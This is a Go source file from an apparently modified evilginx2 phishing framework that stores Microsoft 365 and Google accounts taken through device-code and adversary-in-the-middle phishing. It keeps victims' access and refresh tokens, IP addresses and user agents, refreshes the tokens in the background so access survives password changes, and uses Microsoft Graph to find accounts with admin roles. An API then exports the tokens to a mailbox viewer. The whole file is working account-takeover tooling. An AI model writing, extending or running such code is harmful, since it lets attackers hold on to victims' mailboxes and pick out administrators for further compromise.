package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// MailboxAccount represents a captured O365/Azure account with tokens for persistent mailbox access.
// Accounts are saved to disk and survive password changes as long as tokens are refreshed.
type MailboxAccount struct {
	ID             string    `json:"id"`              // Unique identifier (session ID or generated)
	Email          string    `json:"email"`           // User's email address
	DisplayName    string    `json:"displayName"`     // User's display name from Graph API
	UserPrincipal  string    `json:"userPrincipal"`   // User principal name (UPN)
	TenantID       string    `json:"tenantId"`        // Azure tenant ID
	AccessToken    string    `json:"accessToken"`     // Current access token (1hr validity, auto-refreshed)
	RefreshToken   string    `json:"refreshToken"`    // Refresh token (90 day validity, keeps account alive)
	IDToken        string    `json:"idToken"`         // ID token (JWT with user info)
	TokenExpiry    time.Time `json:"tokenExpiry"`     // When access token expires
	TokenScope     string    `json:"tokenScope"`      // OAuth scopes granted
	ClientID       string    `json:"clientId"`        // Client ID used for tokens
	Provider       string    `json:"provider"`        // "microsoft" or "google"
	Source         string    `json:"source"`          // "device_code", "aitm_session", "manual"
	SessionID      string    `json:"sessionId"`       // Original evilginx session ID if applicable
	Phishlet       string    `json:"phishlet"`        // Phishlet name that captured the account
	CapturedAt     time.Time `json:"capturedAt"`      // When account was first captured
	LastRefresh    time.Time `json:"lastRefresh"`     // Last token refresh time
	RefreshCount   int       `json:"refreshCount"`    // Number of successful refreshes
	Status         string    `json:"status"`          // "active", "needs_refresh", "expired", "error"
	LastError      string    `json:"lastError"`       // Last error message if any
	IsAdmin        bool      `json:"isAdmin"`         // Whether user has admin privileges detected
	AdminRoles     []string  `json:"adminRoles"`      // List of admin roles if any
	Organization   string    `json:"organization"`    // Organization/Tenant name
	Notes          string    `json:"notes"`           // Optional notes/labels
	AutoRefresh    bool      `json:"autoRefresh"`     // Whether to auto-refresh this account
	OriginIP       string    `json:"originIp"`        // Original victim IP address
	UserAgent      string    `json:"userAgent"`       // Original user agent
}

// MailboxAccountManager manages persistent mailbox accounts with auto-refresh
type MailboxAccountManager struct {
	accounts     map[string]*MailboxAccount // keyed by ID
	dataDir      string                     // Directory for persistent storage
	filePath     string                     // Path to accounts JSON file
	mu           sync.RWMutex
	refresher    *TokenAutoRefreshManager
	running      bool
	stopChan     chan struct{}
	refreshMu    sync.Mutex
}

const (
	MAILBOX_ACCOUNTS_FILE      = "mailbox_accounts.json"
	MAILBOX_REFRESH_INTERVAL   = 10 * time.Minute  // Check accounts every 10 minutes
	MAILBOX_TOKEN_EXPIRY_BUFFER = 5 * time.Minute  // Refresh when token expires within 5 minutes
)

// NewMailboxAccountManager creates a new account manager with persistence
func NewMailboxAccountManager(dataDir string) *MailboxAccountManager {
	mgr := &MailboxAccountManager{
		accounts: make(map[string]*MailboxAccount),
		dataDir:  dataDir,
		filePath: filepath.Join(dataDir, MAILBOX_ACCOUNTS_FILE),
		stopChan: make(chan struct{}),
	}

	// Ensure data directory exists
	if err := os.MkdirAll(dataDir, 0755); err != nil {
		log.Error("[mailbox] Failed to create data directory: %v", err)
	}

	// Load existing accounts
	mgr.load()

	return mgr
}

// SetRefresher sets the token auto-refresh manager for token refresh operations
func (m *MailboxAccountManager) SetRefresher(r *TokenAutoRefreshManager) {
	m.refresher = r
}

// load reads accounts from persistent storage
func (m *MailboxAccountManager) load() {
	m.mu.Lock()
	defer m.mu.Unlock()

	data, err := ioutil.ReadFile(m.filePath)
	if err != nil {
		if !os.IsNotExist(err) {
			log.Error("[mailbox] Failed to read accounts file: %v", err)
		}
		return
	}

	var accounts []*MailboxAccount
	if err := json.Unmarshal(data, &accounts); err != nil {
		log.Error("[mailbox] Failed to parse accounts file: %v", err)
		return
	}

	for _, acc := range accounts {
		m.accounts[acc.ID] = acc
	}

	log.Info("[mailbox] Loaded %d accounts from storage", len(accounts))
}

// save persists accounts to disk
func (m *MailboxAccountManager) save() error {
	m.mu.RLock()
	accounts := make([]*MailboxAccount, 0, len(m.accounts))
	for _, acc := range m.accounts {
		accounts = append(accounts, acc)
	}
	m.mu.RUnlock()

	data, err := json.MarshalIndent(accounts, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal accounts: %v", err)
	}

	// Write atomically using temp file
	tmpPath := m.filePath + ".tmp"
	if err := ioutil.WriteFile(tmpPath, data, 0600); err != nil {
		return fmt.Errorf("failed to write temp file: %v", err)
	}

	if err := os.Rename(tmpPath, m.filePath); err != nil {
		return fmt.Errorf("failed to rename temp file: %v", err)
	}

	return nil
}

// AddAccount adds a new account or updates an existing one
func (m *MailboxAccountManager) AddAccount(acc *MailboxAccount) error {
	if acc.ID == "" {
		acc.ID = fmt.Sprintf("mb-%d", time.Now().UnixNano())
	}
	if acc.CapturedAt.IsZero() {
		acc.CapturedAt = time.Now()
	}
	if acc.Status == "" {
		acc.Status = "active"
	}
	acc.AutoRefresh = true

	// Fetch user info if we have an access token but no email
	if acc.AccessToken != "" && acc.Email == "" {
		m.fetchUserInfo(acc)
	}

	m.mu.Lock()
	existing, exists := m.accounts[acc.ID]
	if exists {
		// Update existing account
		existing.AccessToken = acc.AccessToken
		if acc.RefreshToken != "" {
			existing.RefreshToken = acc.RefreshToken
		}
		if acc.IDToken != "" {
			existing.IDToken = acc.IDToken
		}
		existing.TokenExpiry = acc.TokenExpiry
		existing.LastRefresh = time.Now()
		existing.RefreshCount++
		existing.Status = "active"
		existing.LastError = ""
	} else {
		m.accounts[acc.ID] = acc
	}
	m.mu.Unlock()

	if err := m.save(); err != nil {
		log.Error("[mailbox] Failed to save account: %v", err)
		return err
	}

	if exists {
		log.Info("[mailbox] Updated account: %s", acc.Email)
	} else {
		log.Success("[mailbox] Added new account: %s (%s)", acc.Email, acc.ID)
	}

	return nil
}

// AddFromDeviceCode creates and adds an account from captured device code tokens
func (m *MailboxAccountManager) AddFromDeviceCode(dcSession *DeviceCodeSession, sessionID string, phishlet string, originIP string, userAgent string) error {
	acc := &MailboxAccount{
		ID:           fmt.Sprintf("dc-%s-%d", sessionID, time.Now().Unix()),
		AccessToken:  dcSession.AccessToken,
		RefreshToken: dcSession.RefreshToken,
		IDToken:      dcSession.IDToken,
		TokenExpiry:  dcSession.TokenExpiry,
		TokenScope:   dcSession.TokenScope,
		ClientID:     dcSession.ClientID,
		Provider:     dcSession.Provider,
		Source:       "device_code",
		SessionID:    sessionID,
		Phishlet:     phishlet,
		CapturedAt:   time.Now(),
		LastRefresh:  time.Now(),
		Status:       "active",
		AutoRefresh:  true,
		OriginIP:     originIP,
		UserAgent:    userAgent,
	}

	// Extract user info from device code session
	if dcSession.UserInfo != nil {
		acc.Email = dcSession.UserInfo.UserPrincipalName
		acc.DisplayName = dcSession.UserInfo.DisplayName
		acc.UserPrincipal = dcSession.UserInfo.UserPrincipalName
	} else if dcSession.GoogleUser != nil {
		acc.Email = dcSession.GoogleUser.Email
		acc.DisplayName = dcSession.GoogleUser.Name
		acc.Organization = dcSession.GoogleUser.HD
	}

	// If still no email, try to fetch from Graph API
	if acc.Email == "" {
		m.fetchUserInfo(acc)
	}

	return m.AddAccount(acc)
}

// AddFromSession creates an account from a captured session with tokens
func (m *MailboxAccountManager) AddFromSession(s *Session) error {
	refreshToken := s.Custom["dc_refresh_token"]
	accessToken := s.Custom["dc_access_token"]

	// Skip if no tokens
	if refreshToken == "" && accessToken == "" {
		return fmt.Errorf("session has no tokens")
	}

	acc := &MailboxAccount{
		ID:           fmt.Sprintf("sess-%s-%d", s.Id, time.Now().Unix()),
		AccessToken:  accessToken,
		RefreshToken: refreshToken,
		IDToken:      s.Custom["dc_id_token"],
		TokenScope:   s.Custom["dc_scope"],
		ClientID:     s.Custom["dc_client"],
		Provider:     s.Custom["dc_provider"],
		Source:       "aitm_session",
		SessionID:    s.Id,
		Phishlet:     s.Phishlet,
		CapturedAt:   time.Now(),
		LastRefresh:  time.Now(),
		Status:       "active",
		AutoRefresh:  true,
		OriginIP:     s.RemoteAddr,
		UserAgent:    s.UserAgent,
		Email:        s.Custom["dc_user_email"],
		DisplayName:  s.Custom["dc_user_name"],
		Notes:        fmt.Sprintf("Username: %s", s.Username),
	}

	if t, err := time.Parse(time.RFC3339, s.Custom["dc_expires"]); err == nil {
		acc.TokenExpiry = t
	}

	// Fetch additional user info
	if acc.Email == "" {
		m.fetchUserInfo(acc)
	}

	return m.AddAccount(acc)
}

// fetchUserInfo retrieves user info from Microsoft Graph API
func (m *MailboxAccountManager) fetchUserInfo(acc *MailboxAccount) {
	if acc.AccessToken == "" {
		return
	}

	client := GetHttpClient()
	req, _ := http.NewRequest("GET", "https://graph.microsoft.com/v1.0/me?$select=displayName,mail,userPrincipalName,id", nil)
	req.Header.Set("Authorization", "Bearer "+acc.AccessToken)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := client.Do(req)
	if err != nil {
		log.Debug("[mailbox] Failed to fetch user info: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return
	}

	var me struct {
		DisplayName       string `json:"displayName"`
		Mail              string `json:"mail"`
		UserPrincipalName string `json:"userPrincipalName"`
		ID                string `json:"id"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&me); err != nil {
		return
	}

	acc.DisplayName = me.DisplayName
	acc.Email = me.UserPrincipalName
	if acc.Email == "" {
		acc.Email = me.Mail
	}
	acc.UserPrincipal = me.UserPrincipalName

	// Also check for admin roles
	m.checkAdminRoles(acc)
}

// checkAdminRoles checks if the account has admin privileges
func (m *MailboxAccountManager) checkAdminRoles(acc *MailboxAccount) {
	if acc.AccessToken == "" {
		return
	}

	client := GetHttpClient()
	req, _ := http.NewRequest("GET", "https://graph.microsoft.com/v1.0/me/memberOf?$select=displayName,roleTemplateId", nil)
	req.Header.Set("Authorization", "Bearer "+acc.AccessToken)

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return
	}

	var result struct {
		Value []struct {
			ODataType      string `json:"@odata.type"`
			DisplayName    string `json:"displayName"`
			RoleTemplateID string `json:"roleTemplateId"`
		} `json:"value"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return
	}

	adminRoles := []string{}
	for _, r := range result.Value {
		if strings.Contains(r.ODataType, "directoryRole") {
			adminRoles = append(adminRoles, r.DisplayName)
		}
	}

	if len(adminRoles) > 0 {
		acc.IsAdmin = true
		acc.AdminRoles = adminRoles
		log.Warning("[mailbox] Account %s has admin roles: %v", acc.Email, adminRoles)
	}
}

// GetAccount returns an account by ID
func (m *MailboxAccountManager) GetAccount(id string) *MailboxAccount {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.accounts[id]
}

// GetAccountByEmail returns an account by email (case-insensitive)
func (m *MailboxAccountManager) GetAccountByEmail(email string) *MailboxAccount {
	m.mu.RLock()
	defer m.mu.RUnlock()
	email = strings.ToLower(email)
	for _, acc := range m.accounts {
		if strings.ToLower(acc.Email) == email {
			return acc
		}
	}
	return nil
}

// ListAccounts returns all accounts
func (m *MailboxAccountManager) ListAccounts() []*MailboxAccount {
	m.mu.RLock()
	defer m.mu.RUnlock()
	accounts := make([]*MailboxAccount, 0, len(m.accounts))
	for _, acc := range m.accounts {
		accounts = append(accounts, acc)
	}
	return accounts
}

// RemoveAccount removes an account by ID
func (m *MailboxAccountManager) RemoveAccount(id string) error {
	m.mu.Lock()
	delete(m.accounts, id)
	m.mu.Unlock()
	return m.save()
}

// Count returns the number of accounts
func (m *MailboxAccountManager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.accounts)
}

// Start begins the background auto-refresh routine for mailbox accounts
func (m *MailboxAccountManager) Start() {
	m.refreshMu.Lock()
	if m.running {
		m.refreshMu.Unlock()
		return
	}
	m.running = true
	m.refreshMu.Unlock()

	go m.refreshLoop()
	log.Info("[mailbox] Auto-refresh started for %d accounts", m.Count())
}

// Stop terminates the auto-refresh routine
func (m *MailboxAccountManager) Stop() {
	m.refreshMu.Lock()
	defer m.refreshMu.Unlock()

	if m.running {
		close(m.stopChan)
		m.running = false
		log.Info("[mailbox] Auto-refresh stopped")
	}
}

// refreshLoop periodically refreshes all accounts
func (m *MailboxAccountManager) refreshLoop() {
	// Initial refresh on startup
	m.refreshAllAccounts()

	ticker := time.NewTicker(MAILBOX_REFRESH_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			m.refreshAllAccounts()
		case <-m.stopChan:
			return
		}
	}
}

// refreshAllAccounts refreshes tokens for all accounts that need it
func (m *MailboxAccountManager) refreshAllAccounts() {
	m.mu.RLock()
	accounts := make([]*MailboxAccount, 0, len(m.accounts))
	for _, acc := range m.accounts {
		if acc.AutoRefresh && acc.RefreshToken != "" {
			accounts = append(accounts, acc)
		}
	}
	m.mu.RUnlock()

	if len(accounts) == 0 {
		return
	}

	refreshed := 0
	failed := 0

	for _, acc := range accounts {
		// Check if token needs refresh (expired or expiring soon)
		needsRefresh := acc.Status != "active" ||
			time.Now().After(acc.TokenExpiry.Add(-MAILBOX_TOKEN_EXPIRY_BUFFER))

		if !needsRefresh {
			continue
		}

		if err := m.refreshAccountToken(acc); err != nil {
			log.Warning("[mailbox] Failed to refresh %s: %v", acc.Email, err)
			failed++
		} else {
			refreshed++
		}
	}

	if refreshed > 0 || failed > 0 {
		log.Info("[mailbox] Refresh cycle: %d refreshed, %d failed", refreshed, failed)
		m.save()
	}
}

// refreshAccountToken refreshes the token for a single account
func (m *MailboxAccountManager) refreshAccountToken(acc *MailboxAccount) error {
	if acc.RefreshToken == "" {
		acc.Status = "expired"
		acc.LastError = "no refresh token"
		return fmt.Errorf("no refresh token")
	}

	clientID := acc.ClientID
	if clientID == "" {
		clientID = DEFAULT_REFRESH_CLIENT_ID
	}

	scope := acc.TokenScope
	if scope == "" {
		scope = DEFAULT_REFRESH_SCOPE
	} else {
		scope = sanitizeRefreshScope(scope)
	}

	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", acc.RefreshToken)
	data.Set("scope", scope)

	req, _ := http.NewRequest("POST", MS_REFRESH_TOKEN_URL, strings.NewReader(data.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	client := GetHttpClient()
	resp, err := client.Do(req)
	if err != nil {
		acc.Status = "error"
		acc.LastError = err.Error()
		return err
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		var errResp TokenRefreshError
		json.Unmarshal(body, &errResp)
		acc.Status = "expired"
		acc.LastError = errResp.ErrorDescription
		return fmt.Errorf("%s: %s", errResp.Error, errResp.ErrorDescription)
	}

	var tokenResp TokenRefreshResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		acc.Status = "error"
		acc.LastError = "failed to parse response"
		return err
	}

	// Update account with new tokens
	m.mu.Lock()
	acc.AccessToken = tokenResp.AccessToken
	if tokenResp.RefreshToken != "" {
		acc.RefreshToken = tokenResp.RefreshToken
	}
	if tokenResp.IDToken != "" {
		acc.IDToken = tokenResp.IDToken
	}
	acc.TokenExpiry = time.Now().Add(time.Duration(tokenResp.ExpiresIn) * time.Second)
	acc.LastRefresh = time.Now()
	acc.RefreshCount++
	acc.Status = "active"
	acc.LastError = ""
	m.mu.Unlock()

	log.Success("[mailbox] Refreshed token for %s (refresh #%d)", acc.Email, acc.RefreshCount)
	return nil
}

// ManualRefresh forces a refresh of a specific account
func (m *MailboxAccountManager) ManualRefresh(id string) error {
	acc := m.GetAccount(id)
	if acc == nil {
		return fmt.Errorf("account not found: %s", id)
	}
	err := m.refreshAccountToken(acc)
	m.save()
	return err
}

// GetStats returns statistics about the accounts
func (m *MailboxAccountManager) GetStats() (total, active, expired, admins int) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	for _, acc := range m.accounts {
		total++
		if acc.Status == "active" {
			active++
		} else {
			expired++
		}
		if acc.IsAdmin {
			admins++
		}
	}
	return
}

// ExportForMailbox returns accounts in a format suitable for the mailbox viewer
func (m *MailboxAccountManager) ExportForMailbox() []map[string]interface{} {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]map[string]interface{}, 0, len(m.accounts))
	for _, acc := range m.accounts {
		result = append(result, map[string]interface{}{
			"id":            acc.ID,
			"feedId":        acc.ID,
			"email":         acc.Email,
			"displayName":   acc.DisplayName,
			"accessToken":   acc.AccessToken,
			"refreshToken":  acc.RefreshToken,
			"idToken":       acc.IDToken,
			"tokenExpiry":   acc.TokenExpiry.Format(time.RFC3339),
			"tokenScope":    acc.TokenScope,
			"clientId":      acc.ClientID,
			"tenantId":      acc.TenantID,
			"provider":      acc.Provider,
			"sessionId":     acc.SessionID,
			"status":        acc.Status,
			"capturedAt":    acc.CapturedAt.Format(time.RFC3339),
			"lastRefresh":   acc.LastRefresh.Format(time.RFC3339),
			"isAdmin":       acc.IsAdmin,
			"adminRoles":    acc.AdminRoles,
			"organization":  acc.Organization,
			"source":        acc.Source,
			"phishlet":      acc.Phishlet,
			"userPrincipal": acc.UserPrincipal,
		})
	}
	return result
}

// HandleAPIRequest handles the /api/v1/mailbox endpoint
func (m *MailboxAccountManager) HandleAPIRequest(apiKey, requestKey, action string) (string, int) {
	if requestKey != apiKey {
		return `{"error":"unauthorized"}`, 401
	}

	switch action {
	case "list", "":
		accounts := m.ExportForMailbox()
		data, _ := json.Marshal(map[string]interface{}{
			"accounts":  accounts,
			"count":     len(accounts),
			"timestamp": time.Now().UTC().Format(time.RFC3339),
		})
		return string(data), 200

	case "stats":
		total, active, expired, admins := m.GetStats()
		data, _ := json.Marshal(map[string]interface{}{
			"total":   total,
			"active":  active,
			"expired": expired,
			"admins":  admins,
		})
		return string(data), 200

	case "export":
		// Export accounts in M365-Mail app compatible format (plain array)
		accounts := m.ListAccounts()
		exportData := make([]map[string]interface{}, 0)
		for i, acc := range accounts {
			if acc.RefreshToken == "" && acc.AccessToken == "" {
				continue
			}
			// Generate a unique ID - use capture timestamp + index to ensure uniqueness
			accountID := fmt.Sprintf("%d-%s", acc.CapturedAt.UnixNano()/1000000, acc.ID)
			if accountID == "" || accountID == "0-" {
				// Fallback with index for uniqueness
				accountID = fmt.Sprintf("%d-%d-%s", time.Now().UnixNano()/1000000, i, acc.Email)
			}
			exportData = append(exportData, map[string]interface{}{
				"id":           accountID,
				"email":        acc.Email,
				"displayName":  acc.DisplayName,
				"accessToken":  acc.AccessToken,
				"refreshToken": acc.RefreshToken,
				"label":        "Imported",
				"addedAt":      acc.CapturedAt.Format(time.RFC3339),
				"unreadCount":  0,
				"autoImported": false,
			})
		}
		// Return plain array format that M365-Mail expects
		data, _ := json.MarshalIndent(exportData, "", "  ")
		return string(data), 200

	default:
		return `{"error":"unknown action"}`, 400
	}
}

// sanitizeRefreshScope strips .default from scopes that also contain
// resource-specific scopes. Microsoft rejects refresh requests that mix
// .default with explicit graph resource scopes, but token responses
// often include .default at the end of the expanded scope list.
func sanitizeRefreshScope(scope string) string {
	if !strings.Contains(scope, ".default") {
		return scope
	}

	parts := strings.Fields(scope)
	var hasResourceScopes bool
	var clean []string

	for _, p := range parts {
		if strings.HasPrefix(p, "https://") {
			if strings.HasSuffix(p, "/.default") {
				// Skip .default if we have other resource scopes
				continue
			}
			hasResourceScopes = true
		}
		clean = append(clean, p)
	}

	// Only strip .default if there are other resource scopes to use
	if hasResourceScopes {
		result := strings.Join(clean, " ")
		if result != scope {
			log.Debug("[mailbox] Sanitized scope: stripped .default (had %d resource scopes)", len(clean))
		}
		return result
	}

	// No other resource scopes — .default is the only one, keep it
	return scope
}
